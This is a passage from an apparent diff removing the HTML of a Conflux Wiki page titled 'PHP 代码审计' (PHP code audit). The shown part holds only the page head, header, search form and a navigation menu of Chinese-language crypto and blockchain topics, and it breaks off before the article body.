@@ -1,223 +1,1369 @@
-<!doctype html><html lang=zh class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Conflux Wiki"><meta name=author content="Conflux Wiki Team"><link href=https://conflux-wiki.github.io/web/php/php/ rel=canonical><link rel=icon href=../../../assets/images/favicon.png><meta name=generator content="mkdocs-1.2.1, mkdocs-material-7.1.10"><title>PHP 代码审计 - Conflux Wiki</title><link rel=stylesheet href=../../../assets/stylesheets/main.1fe995fd.min.css><link rel=stylesheet href=../../../assets/stylesheets/palette.f1a3b89f.min.css><meta name=theme-color content=#ffffff><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback"><style>:root{--md-text-font-family:"Noto Sans";--md-code-font-family:"Source Code Pro"}</style><link rel=stylesheet href=../../../static/css/extra.css></head> <body dir=ltr data-md-color-scheme=preference data-md-color-primary=white data-md-color-accent=red> <script>function __prefix(e){return new URL("../../..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#php class=md-skip> 跳转至 </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../../.. title="Conflux Wiki" class="md-header__button md-logo" aria-label="Conflux Wiki" data-md-component=logo> <img src=../../../static/img/logo.png alt=logo> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> Conflux Wiki </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> PHP 代码审计 </span> </div> </div> </div> <div class=md-header__option> <div class=md-select> <button class="md-header__button md-icon" aria-label="Select language"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="m12.87 15.07-2.54-2.51.03-.03A17.52 17.52 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04M18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12m-2.62 7 1.62-4.33L19.12 17h-3.24z"/></svg> </button> <div class=md-select__inner> <ul class=md-select__list> <li class=md-select__item> <a href=/ hreflang class=md-select__link> zh - 汉语 </a> </li> <li class=md-select__item> <a href=/en/ hreflang class=md-select__link> en - English </a> </li> </ul> </div> </div> </div> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=搜索 placeholder=搜索 autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query data-md-state=active required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <button type=reset class="md-search__icon md-icon" aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> 正在初始化搜索引擎 </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/conflux-wiki/conflux-wiki/ title="前往 GitHub 仓库" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> conflux-wiki/conflux-wiki </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../../.. class=md-tabs__link> Start </a> </li> <li class=md-tabs__item> <a href=../../../introduction/history/ class=md-tabs__link> Introduction </a> </li> <li class=md-tabs__item> <a href=../../../crypto/introduction/ class=md-tabs__link> Crypto </a> </li> <li class=md-tabs__item> <a href=../../../development/introduction/ class=md-tabs__link> Development </a> </li> <li class=md-tabs__item> <a href=../../../ecosystem/introduction/ class=md-tabs__link> Ecosystem </a> </li> <li class=md-tabs__item> <a href=../../introduction/ class="md-tabs__link md-tabs__link--active"> Web </a> </li> <li class=md-tabs__item> <a href=../../../blockchain/introduction/ class=md-tabs__link> BlockChain </a> </li> <li class=md-tabs__item> <a href=../../../nft/introduction/ class=md-tabs__link> NFT </a> </li> </ul> </div> </nav> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../../.. title="Conflux Wiki" class="md-nav__button md-logo" aria-label="Conflux Wiki" data-md-component=logo> <img src=../../../static/img/logo.png alt=logo> </a> Conflux Wiki </label> <div class=md-nav__source> <a href=https://github.com/conflux-wiki/conflux-wiki/ title="前往 GitHub 仓库" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> conflux-wiki/conflux-wiki </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1 type=checkbox id=__nav_1> <label class=md-nav__link for=__nav_1> Start <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Start data-md-level=1> <label class=md-nav__title for=__nav_1> <span class="md-nav__icon md-icon"></span> Start </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../.. class=md-nav__link> 简介 </a> </li> <li class=md-nav__item> <a href=../../../usage/ class=md-nav__link> 如何使用 Conflux Wiki </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1_3 type=checkbox id=__nav_1_3> <label class=md-nav__link for=__nav_1_3> 贡献指南 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=贡献指南 data-md-level=2> <label class=md-nav__title for=__nav_1_3> <span class="md-nav__icon md-icon"></span> 贡献指南 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../contribute/before-contributing/ class=md-nav__link> 贡献之前 </a> </li> <li class=md-nav__item> <a href=../../../contribute/basic-contribute-approach/ class=md-nav__link> 基本贡献方式 </a> </li> <li class=md-nav__item> <a href=../../../contribute/documentation-requirement/ class=md-nav__link> 贡献文档要求 </a> </li> <li class=md-nav__item> <a href=../../../contribute/translation/ class=md-nav__link> 翻译 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../discussion/ class=md-nav__link> 讨论交流 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2> <label class=md-nav__link for=__nav_2> Introduction <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Introduction data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Introduction </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../introduction/history/ class=md-nav__link> 区块链 历史 </a> </li> <li class=md-nav__item> <a href=../../../introduction/link/ class=md-nav__link> Conflux相关链接 </a> </li> <li class=md-nav__item> <a href=../../../introduction/highlight-time/ class=md-nav__link> 重要时刻 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3> Crypto <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Crypto data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Crypto </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/introduction/ class=md-nav__link> 密码学简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_2 type=checkbox id=__nav_3_2> <label class=md-nav__link for=__nav_3_2> 基础数学知识 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=基础数学知识 data-md-level=2> <label class=md-nav__title for=__nav_3_2> <span class="md-nav__icon md-icon"></span> 基础数学知识 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/basic/introduction/ class=md-nav__link> 基础数学知识 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_3 type=checkbox id=__nav_3_3> <label class=md-nav__link for=__nav_3_3> 古典密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=古典密码 data-md-level=2> <label class=md-nav__title for=__nav_3_3> <span class="md-nav__icon md-icon"></span> 古典密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/classical/introduction/ class=md-nav__link> 古典密码简介 </a> </li> <li class=md-nav__item> <a href=../../../crypto/classical/monoalphabetic/ class=md-nav__link> 单表代换加密 </a> </li> <li class=md-nav__item> <a href=../../../crypto/classical/polyalphabetic/ class=md-nav__link> 多表代换加密 </a> </li> <li class=md-nav__item> <a href=../../../crypto/classical/others/ class=md-nav__link> 其它类型加密 </a> </li> <li class=md-nav__item> <a href=../../../crypto/classical/summary/ class=md-nav__link> 总结 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_4 type=checkbox id=__nav_3_4> <label class=md-nav__link for=__nav_3_4> 流密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=流密码 data-md-level=2> <label class=md-nav__title for=__nav_3_4> <span class="md-nav__icon md-icon"></span> 流密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/streamcipher/intro/ class=md-nav__link> 流密码 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_4_2 type=checkbox id=__nav_3_4_2> <label class=md-nav__link for=__nav_3_4_2> 伪随机数生成器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=伪随机数生成器 data-md-level=3> <label class=md-nav__title for=__nav_3_4_2> <span class="md-nav__icon md-icon"></span> 伪随机数生成器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/streamcipher/prng/intro/ class=md-nav__link> 伪随机数生成器介绍 </a> </li> <li class=md-nav__item> <a href=../../../crypto/streamcipher/prng/csprng/ class=md-nav__link> 密码安全伪随机数生成器 </a> </li> <li class=md-nav__item> <a href=../../../crypto/streamcipher/prng/problem/ class=md-nav__link> 题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_4_3 type=checkbox id=__nav_3_4_3> <label class=md-nav__link for=__nav_3_4_3> 线性同余生成器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=线性同余生成器 data-md-level=3> <label class=md-nav__title for=__nav_3_4_3> <span class="md-nav__icon md-icon"></span> 线性同余生成器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/streamcipher/lcg/intro/ class=md-nav__link> 线性同余生成器 </a> </li> <li class=md-nav__item> <a href=../../../crypto/streamcipher/lcg/challenge/ class=md-nav__link> 题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_4_4 type=checkbox id=__nav_3_4_4> <label class=md-nav__link for=__nav_3_4_4> 反馈移位寄存器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=反馈移位寄存器 data-md-level=3> <label class=md-nav__title for=__nav_3_4_4> <span class="md-nav__icon md-icon"></span> 反馈移位寄存器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/streamcipher/fsr/intro/ class=md-nav__link> 反馈移位寄存器 </a> </li> <li class=md-nav__item> <a href=../../../crypto/streamcipher/fsr/lfsr/ class=md-nav__link> 线性反馈移位寄存器 - LFSR </a> </li> <li class=md-nav__item> <a href=../../../crypto/streamcipher/fsr/nfsr/ class=md-nav__link> 非线性反馈移位寄存器 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_4_5 type=checkbox id=__nav_3_4_5> <label class=md-nav__link for=__nav_3_4_5> 特殊流密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=特殊流密码 data-md-level=3> <label class=md-nav__title for=__nav_3_4_5> <span class="md-nav__icon md-icon"></span> 特殊流密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/streamcipher/special/rc4/ class=md-nav__link> RC4 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_5 type=checkbox id=__nav_3_5> <label class=md-nav__link for=__nav_3_5> 块加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=块加密 data-md-level=2> <label class=md-nav__title for=__nav_3_5> <span class="md-nav__icon md-icon"></span> 块加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/blockcipher/introduction/ class=md-nav__link> 块加密 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_5_2 type=checkbox id=__nav_3_5_2> <label class=md-nav__link for=__nav_3_5_2> ARX <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ARX data-md-level=3> <label class=md-nav__title for=__nav_3_5_2> <span class="md-nav__icon md-icon"></span> ARX </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/blockcipher/arx-operations/ class=md-nav__link> ARX: Add-Rotate-Xor </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_5_3 type=checkbox id=__nav_3_5_3> <label class=md-nav__link for=__nav_3_5_3> DES <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=DES data-md-level=3> <label class=md-nav__title for=__nav_3_5_3> <span class="md-nav__icon md-icon"></span> DES </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/blockcipher/des/ class=md-nav__link> DES </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_5_4 type=checkbox id=__nav_3_5_4> <label class=md-nav__link for=__nav_3_5_4> IDEA <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=IDEA data-md-level=3> <label class=md-nav__title for=__nav_3_5_4> <span class="md-nav__icon md-icon"></span> IDEA </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/blockcipher/idea/ class=md-nav__link> IDEA </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_5_5 type=checkbox id=__nav_3_5_5> <label class=md-nav__link for=__nav_3_5_5> AES <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=AES data-md-level=3> <label class=md-nav__title for=__nav_3_5_5> <span class="md-nav__icon md-icon"></span> AES </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/blockcipher/aes/ class=md-nav__link> AES </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_5_6 type=checkbox id=__nav_3_5_6> <label class=md-nav__link for=__nav_3_5_6> Simon and Speck <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Simon and Speck" data-md-level=3> <label class=md-nav__title for=__nav_3_5_6> <span class="md-nav__icon md-icon"></span> Simon and Speck </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/blockcipher/simon-speck/ class=md-nav__link> Simon and Speck Block Ciphers </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_5_7 type=checkbox id=__nav_3_5_7> <label class=md-nav__link for=__nav_3_5_7> 分组模式 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=分组模式 data-md-level=3> <label class=md-nav__title for=__nav_3_5_7> <span class="md-nav__icon md-icon"></span> 分组模式 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/blockcipher/mode/introduction/ class=md-nav__link> 分组模式 </a> </li> <li class=md-nav__item> <a href=../../../crypto/blockcipher/mode/padding/ class=md-nav__link> 填充方式 </a> </li> <li class=md-nav__item> <a href=../../../crypto/blockcipher/mode/ecb/ class=md-nav__link> ECB </a> </li> <li class=md-nav__item> <a href=../../../crypto/blockcipher/mode/cbc/ class=md-nav__link> CBC </a> </li> <li class=md-nav__item> <a href=../../../crypto/blockcipher/mode/pcbc/ class=md-nav__link> PCBC </a> </li> <li class=md-nav__item> <a href=../../../crypto/blockcipher/mode/cfb/ class=md-nav__link> CFB </a> </li> <li class=md-nav__item> <a href=../../../crypto/blockcipher/mode/ofb/ class=md-nav__link> OFB </a> </li> <li class=md-nav__item> <a href=../../../crypto/blockcipher/mode/ctr/ class=md-nav__link> CTR </a> </li> <li class=md-nav__item> <a href=../../../crypto/blockcipher/mode/padding-oracle-attack/ class=md-nav__link> Padding Oracle Attack </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_6 type=checkbox id=__nav_3_6> <label class=md-nav__link for=__nav_3_6> 非对称加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=非对称加密 data-md-level=2> <label class=md-nav__title for=__nav_3_6> <span class="md-nav__icon md-icon"></span> 非对称加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/asymmetric/introduction/ class=md-nav__link> 介绍 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_6_2 type=checkbox id=__nav_3_6_2> <label class=md-nav__link for=__nav_3_6_2> RSA <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=RSA data-md-level=3> <label class=md-nav__title for=__nav_3_6_2> <span class="md-nav__icon md-icon"></span> RSA </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/asymmetric/rsa/rsa_theory/ class=md-nav__link> RSA 介绍 </a> </li> <li class=md-nav__item> <a href=../../../crypto/asymmetric/rsa/rsa_module_attack/ class=md-nav__link> 模数相关攻击 </a> </li> <li class=md-nav__item> <a href=../../../crypto/asymmetric/rsa/rsa_e_attack/ class=md-nav__link> 公钥指数相关攻击 </a> </li> <li class=md-nav__item> <a href=../../../crypto/asymmetric/rsa/rsa_d_attack/ class=md-nav__link> 私钥 d 相关攻击 </a> </li> <li class=md-nav__item> <a href=../../../crypto/asymmetric/rsa/rsa_coppersmith_attack/ class=md-nav__link> Coppersmith 相关攻击 </a> </li> <li class=md-nav__item> <a href=../../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher/ class=md-nav__link> RSA 选择明密文攻击 </a> </li> <li class=md-nav__item> <a href=../../../crypto/asymmetric/rsa/rsa_side_channel/ class=md-nav__link> RSA 侧信道攻击 </a> </li> <li class=md-nav__item> <a href=../../../crypto/asymmetric/rsa/rsa_pkcs_attack/ class=md-nav__link> Bleichenbacher's attack </a> </li> <li class=md-nav__item> <a href=../../../crypto/asymmetric/rsa/rsa_complex/ class=md-nav__link> RSA 复杂题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_6_3 type=checkbox id=__nav_3_6_3> <label class=md-nav__link for=__nav_3_6_3> 背包加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=背包加密 data-md-level=3> <label class=md-nav__title for=__nav_3_6_3> <span class="md-nav__icon md-icon"></span> 背包加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/asymmetric/knapsack/knapsack/ class=md-nav__link> 背包加密 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_6_4 type=checkbox id=__nav_3_6_4> <label class=md-nav__link for=__nav_3_6_4> 离散对数相关 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=离散对数相关 data-md-level=3> <label class=md-nav__title for=__nav_3_6_4> <span class="md-nav__icon md-icon"></span> 离散对数相关 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/asymmetric/discrete-log/discrete-log/ class=md-nav__link> 离散对数 </a> </li> <li class=md-nav__item> <a href=../../../crypto/asymmetric/discrete-log/elgamal/ class=md-nav__link> ElGamal </a> </li> <li class=md-nav__item> <a href=../../../crypto/asymmetric/discrete-log/ecc/ class=md-nav__link> ECC </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_6_5 type=checkbox id=__nav_3_6_5> <label class=md-nav__link for=__nav_3_6_5> 格密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=格密码 data-md-level=3> <label class=md-nav__title for=__nav_3_6_5> <span class="md-nav__icon md-icon"></span> 格密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/asymmetric/lattice/overview/ class=md-nav__link> 格概述 </a> </li> <li class=md-nav__item> <a href=../../../crypto/asymmetric/lattice/introduction/ class=md-nav__link> 基本介绍 </a> </li> <li class=md-nav__item> <a href=../../../crypto/asymmetric/lattice/lattice-reduction/ class=md-nav__link> 格基规约算法 </a> </li> <li class=md-nav__item> <a href=../../../crypto/asymmetric/lattice/cvp/ class=md-nav__link> CVP </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_7 type=checkbox id=__nav_3_7> <label class=md-nav__link for=__nav_3_7> 哈希函数 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=哈希函数 data-md-level=2> <label class=md-nav__title for=__nav_3_7> <span class="md-nav__icon md-icon"></span> 哈希函数 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/hash/introduction/ class=md-nav__link> 哈希函数 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_7_2 type=checkbox id=__nav_3_7_2> <label class=md-nav__link for=__nav_3_7_2> MD5 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=MD5 data-md-level=3> <label class=md-nav__title for=__nav_3_7_2> <span class="md-nav__icon md-icon"></span> MD5 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/hash/md5/ class=md-nav__link> MD5 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_7_3 type=checkbox id=__nav_3_7_3> <label class=md-nav__link for=__nav_3_7_3> SHA1 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SHA1 data-md-level=3> <label class=md-nav__title for=__nav_3_7_3> <span class="md-nav__icon md-icon"></span> SHA1 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/hash/sha1/ class=md-nav__link> SHA1 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_7_4 type=checkbox id=__nav_3_7_4> <label class=md-nav__link for=__nav_3_7_4> FNV <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=FNV data-md-level=3> <label class=md-nav__title for=__nav_3_7_4> <span class="md-nav__icon md-icon"></span> FNV </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/hash/fnv/ class=md-nav__link> Fowler–Noll–Vo hash function </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_7_5 type=checkbox id=__nav_3_7_5> <label class=md-nav__link for=__nav_3_7_5> Hash Attack <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Hash Attack" data-md-level=3> <label class=md-nav__title for=__nav_3_7_5> <span class="md-nav__icon md-icon"></span> Hash Attack </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/hash/attack/ class=md-nav__link> Hash 